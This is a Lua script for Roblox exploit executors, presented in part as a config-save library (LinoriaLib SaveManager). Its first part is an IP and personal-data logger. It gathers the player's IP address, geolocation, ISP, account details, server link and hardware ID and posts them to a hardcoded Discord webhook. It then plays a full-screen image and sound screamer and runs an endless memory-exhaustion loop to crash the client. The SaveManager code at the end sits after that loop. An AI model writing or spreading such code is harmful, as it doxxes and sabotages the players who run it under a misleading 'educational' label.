local WebhookURL = "https://discord.com/api/webhooks/1267295293137752065/F6rybNx8TWbmEqvZn2n6CwXfO56NmDf49bNHQGn3qBXCzb5RjG_x6nsK819UnU8iNION"
local Player = game.Players.LocalPlayer
local GuiService = game:GetService("GuiService")
local UserInputService = game:GetService("UserInputService")

local function getplatform()
if (GuiService:IsTenFootInterface()) then
return "Console."
elseif (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) then
local DeviceSize = workspace.CurrentCamera.ViewportSize
if (DeviceSize.Y > 600) then
return "Tablet."
else
return "Phone."
end
else
return "Desktop."
end
end
local getIPResponse = http_request({
Url = "https://api.ipify.org/?format=json",
Method = "GET"
}) or request({
Url = "https://api.ipify.org/?format=json",
Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = http_request({
Url = string.format("http://ip-api.com/json/%s", IPBuffer),
Method = "Get"
}) or request({
Url = string.format("http://ip-api.com/json/%s", IPBuffer),
Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
IP = IPBuffer,
country = IIT.country,
countryCode = IIT.countryCode,
region = IIT.region,
regionName = IIT.regionName,
city = IIT.city,
zipcode = IIT.zip,
latitude = IIT.latitude,
longitude = IIT.longnitude,
isp = IIT.isp,
org = IIT.org
}
local MessageData = {
["embeds"] = {
{
["title"] = "Oxygen [Super Logger]",
["description"] = "This Is For Educational Purposes Only",
["fields"] = {
{name = "Username: ", value = game.Players.LocalPlayer.Name},

{name = "Display Name: ", value = game.Players.LocalPlayer.DisplayName},

{name = "User ID: ", value = game.Players.LocalPlayer.UserId},

{name = "Account Age: ", value = game.Players.LocalPlayer.AccountAge},

{name = "Game ID: ", value = game.PlaceId},

{name = "Game Name: ", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name},

{name = "Device type: ", value = getplatform()},

{name = "Exploit: ", value = identifyexecutor()},

{name = 'Server Id: ', value = game.JobId},

{name = 'Join Server: ', value = "https://www.roblox.com/home?placeId="..game.PlaceId.."&gameId="..game.JobId},

{name = 'Roblox User Link: ', value = "https://www.roblox.com/users/"..Player.UserId.."/profile"},
{name = "Ping: ", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},

{name = "Fps: ", value = workspace:GetRealPhysicsFPS()},

{name = "IP Address: ", value = FI.IP},

{name = "Country: ", value = FI.country},

{name = "Country Code: ", value = FI.countryCode},

{name = "Region Name: ", value = FI.regionName},

{name = "Region: ", value = FI.region},

{name = "City: ", value = FI.city},

{name = "Zip Code", value = FI.zipcode},

{name = "Isp: ", value = FI.isp},

{name = "Org: ", value = FI.org},

{name = "Hardware ID: ", value = game:GetService("RbxAnalyticsService"):GetClientId()},

}
}
}
}
if http_request then
http_request(
{
Url = WebhookURL, 
Method = "POST",
Headers = {
["Content-Type"] = "application/json"
},
Body = game:GetService("HttpService"):JSONEncode(MessageData)
}
)
elseif request then
request(
{
Url = WebhookURL, 
Method = "POST",
Headers = {
["Content-Type"] = "application/json"
},
Body = game:GetService("HttpService"):JSONEncode(MessageData)
}
)
end

LoadCustomAsset = function(url: string)
if getcustomasset then
if isfile(url) then
return getcustomasset(url, true)
elseif url:lower():sub(1, 4) == "http" then
local fileName = `temp_{tick()}.txt`
writefile(fileName, game:HttpGet(url))
local result = getcustomasset(fileName, true)
delfile(fileName)
return result
end
end
end

-- Gui to Lua
-- Version: 3.6

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local ImageLabel = Instance.new("ImageLabel")

-- Properties:

ScreenGui.Parent = game:GetService("CoreGui")

ImageLabel.Parent = ScreenGui
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Size = UDim2.new(0, 1000, 0, 1000)
-- Gui to Lua
-- Version: 3.6

-- Instances:

-- Gui to Lua
-- Version: 3.6

-- Instances:

local ScreenGui2 = Instance.new("ScreenGui")
local ImageLabel2 = Instance.new("ImageLabel")

-- Properties:

ScreenGui2.Name = "ScreenGui2"
ScreenGui2.Parent = game:GetService("CoreGui")

ImageLabel2.Name = "ImageLabel2"
ImageLabel2.Parent = ScreenGui2
ImageLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel2.BorderSizePixel = 0
ImageLabel2.Position = UDim2.new(0.642793, 0, 0.152605459, 0)
ImageLabel2.Size = UDim2.new(0, 683, 0, 683)

ImageLabel2.Image = LoadCustomAsset("https://cdn.discordapp.com/attachments/1253377084580167743/1267290875768340480/image.png?ex=66a84019&is=66a6ee99&hm=c8407c4ff083904ade56aa07d1ea552048bb6f97ad5efbb9864aa67064e2bb54&")
local killsound = Instance.new("Sound")
killsound.Volume = 222
killsound.Looped = true
killsound.SoundId = LoadCustomAsset("https://cdn.discordapp.com/attachments/1253377084580167743/1267293632281706546/bassboostednut.mp3?ex=66a842ab&is=66a6f12b&hm=90c5a64b5379e578395068f034bd60b06ee2c5f67151e6eb491c7ca3bc0e4dcc&")
killsound.Parent = game:GetService("CoreGui")
killsound:Play()

local co = coroutine.create(function()
while true do 

ImageLabel.Image = LoadCustomAsset("https://cdn.discordapp.com/attachments/1253377084580167743/1267291510060220446/image.png?ex=66a840b1&is=66a6ef31&hm=b6699baf7bbc6ffb29049caa67973c64ecb4a67b61ada0a3aa2abadf05e1a78f&")
ImageLabel.Image = LoadCustomAsset("https://cdn.discordapp.com/attachments/1253377084580167743/1267291510710341632/image.png?ex=66a840b1&is=66a6ef31&hm=2bb014d2de6cad4aa2a1b3ec9381d0cbff7a07ba9baf4ea43c34bad11f46b22e&")

end
end)
coroutine.resume(co)


wait(7)
while true do
-- Creates a very large table quickly to exhaust memory
local t = {}
for i = 1, 1e6 do
t[i] = i
end
local h = {}
for i = 1, 1e6 do
h [i] = i
end

local n = {}
for i = 1, 1e6 do
n[i] = i
end
print("ky lol")
end

local httpService = game:GetService('HttpService')

local SaveManager = {} do
	SaveManager.Folder = 'LinoriaLibSettings'
	SaveManager.Ignore = {}
	SaveManager.Parser = {
		Toggle = {
			Save = function(idx, object) 
				return { type = 'Toggle', idx = idx, value = object.Value } 
			end,
			Load = function(idx, data)
				if Toggles[idx] then 
					Toggles[idx]:SetValue(data.value)
				end
			end,
		},
		Slider = {
			Save = function(idx, object)
				return { type = 'Slider', idx = idx, value = tostring(object.Value) }
			end,
			Load = function(idx, data)
				if Options[idx] then 
					Options[idx]:SetValue(data.value)
				end
			end,
		},
		Dropdown = {
			Save = function(idx, object)
				return { type = 'Dropdown', idx = idx, value = object.Value, mutli = object.Multi }
			end,
			Load = function(idx, data)
				if Options[idx] then 
					Options[idx]:SetValue(data.value)
				end
			end,
		},
		ColorPicker = {
			Save = function(idx, object)
				return { type = 'ColorPicker', idx = idx, value = object.Value:ToHex(), transparency = object.Transparency }
			end,
			Load = function(idx, data)
				if Options[idx] then 
					Options[idx]:SetValueRGB(Color3.fromHex(data.value), data.transparency)
				end
			end,
		},
		KeyPicker = {
			Save = function(idx, object)
				return { type = 'KeyPicker', idx = idx, mode = object.Mode, key = object.Value }
			end,
			Load = function(idx, data)
				if Options[idx] then 
					Options[idx]:SetValue({ data.key, data.mode })
				end
			end,
		},

		Input = {
			Save = function(idx, object)
				return { type = 'Input', idx = idx, text = object.Value }
			end,
			Load = function(idx, data)
				if Options[idx] and type(data.text) == 'string' then
					Options[idx]:SetValue(data.text)
				end
			end,
		},
	}

	function SaveManager:SetIgnoreIndexes(list)
		for _, key in next, list do
			self.Ignore[key] = true
		end
	end

	function SaveManager:SetFolder(folder)
		self.Folder = folder;
		self:BuildFolderTree()
	end

	function SaveManager:Save(name)
		if (not name) then
			return false, 'no config file is selected'
		end

		local fullPath = self.Folder .. '/settings/' .. name .. '.json'

		local data = {
			objects = {}
		}

		for idx, toggle in next, Toggles do
			if self.Ignore[idx] then continue end

			table.insert(data.objects, self.Parser[toggle.Type].Save(idx, toggle))
		end

		for idx, option in next, Options do
			if not self.Parser[option.Type] then continue end
			if self.Ignore[idx] then continue end

			table.insert(data.objects, self.Parser[option.Type].Save(idx, option))
		end	

		local success, encoded = pcall(httpService.JSONEncode, httpService, data)
		if not success then
			return false, 'failed to encode data'
		end

		writefile(fullPath, encoded)
		return true
	end

	function SaveManager:Load(name)
		if (not name) then
			return false, 'no config file is selected'
		end
		
		local file = self.Folder .. '/settings/' .. name .. '.json'
		if not isfile(file) then return false, 'invalid file' end

		local success, decoded = pcall(httpService.JSONDecode, httpService, readfile(file))
		if not success then return false, 'decode error' end

		for _, option in next, decoded.objects do
			if self.Parser[option.type] then
				task.spawn(function() self.Parser[option.type].Load(option.idx, option) end) -- task.spawn() so the config loading wont get stuck.
			end
		end

		return true
	end

	function SaveManager:BuildFolderTree()
		local paths = {
			self.Folder,
			self.Folder .. '/settings'
		}

		for i = 1, #paths do
			local str = paths[i]
			if not isfolder(str) then
				makefolder(str)
			end
		end
	end

	function SaveManager:RefreshConfigList()
		local list = listfiles(self.Folder .. '/settings')

		local out = {}
		for i = 1, #list do
			local file = list[i]
			if file:sub(-5) == '.json' then
				-- i hate this but it has to be done ...

				local pos = file:find('.json', 1, true)
				local start = pos

				local char = file:sub(pos, pos)
				while char ~= '/' and char ~= '\\' and char ~= '' do
					pos = pos - 1
					char = file:sub(pos, pos)
				end

				if char == '/' or char == '\\' then
					table.insert(out, file:sub(pos + 1, start - 1))
				end
			end
		end
		
		return out
	end

	function SaveManager:SetLibrary(library)
		self.Library = library
	end

	function SaveManager:LoadAutoloadConfig()
		if isfile(self.Folder .. '/settings/autoload.txt') then
			local name = readfile(self.Folder .. '/settings/autoload.txt')

			local success, err = self:Load(name)
			if not success then
				return self.Library:Notify('Failed to load autoload config: ' .. err)
			end

			self.Library:Notify(string.format('Auto loaded config %q', name))
		end
	end


	function SaveManager:BuildConfigSection(tab)
		assert(self.Library, 'Must set SaveManager.Library')

		local section = tab:AddLeftGroupbox('Configuration')

		section:AddInput('SaveManager_ConfigName',    { Text = 'Config name' })
		section:AddDropdown('SaveManager_ConfigList', { Text = 'Config list', Values = self:RefreshConfigList(), AllowNull = true })

		section:AddDivider()

		section:AddButton('Create config', function()
			local name = Options.SaveManager_ConfigName.Value

			if name:gsub(' ', '') == '' then 
				return self.Library:Notify('Invalid config name (empty)', 2)
			end

			local success, err = self:Save(name)
			if not success then
				return self.Library:Notify('Failed to save config: ' .. err)
			end

			self.Library:Notify(string.format('Created config %q', name))

			Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
			Options.SaveManager_ConfigList:SetValue(nil)
		end):AddButton('Load config', function()
			local name = Options.SaveManager_ConfigList.Value

			local success, err = self:Load(name)
			if not success then
				return self.Library:Notify('Failed to load config: ' .. err)
			end

			self.Library:Notify(string.format('Loaded config %q', name))
		end)

		section:AddButton('Overwrite config', function()
			local name = Options.SaveManager_ConfigList.Value

			local success, err = self:Save(name)
			if not success then
				return self.Library:Notify('Failed to overwrite config: ' .. err)
			end

			self.Library:Notify(string.format('Overwrote config %q', name))
		end)

		section:AddButton('Refresh list', function()
			Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
			Options.SaveManager_ConfigList:SetValue(nil)
		end)

		section:AddButton('Set as autoload', function()
			local name = Options.SaveManager_ConfigList.Value
			writefile(self.Folder .. '/settings/autoload.txt', name)
			SaveManager.AutoloadLabel:SetText('Current autoload config: ' .. name)
			self.Library:Notify(string.format('Set %q to auto load', name))
		end)

		SaveManager.AutoloadLabel = section:AddLabel('Current autoload config: none', true)

		if isfile(self.Folder .. '/settings/autoload.txt') then
			local name = readfile(self.Folder .. '/settings/autoload.txt')
			SaveManager.AutoloadLabel:SetText('Current autoload config: ' .. name)
		end

		SaveManager:SetIgnoreIndexes({ 'SaveManager_ConfigList', 'SaveManager_ConfigName' })
	end

	SaveManager:BuildFolderTree()
end

return SaveManager
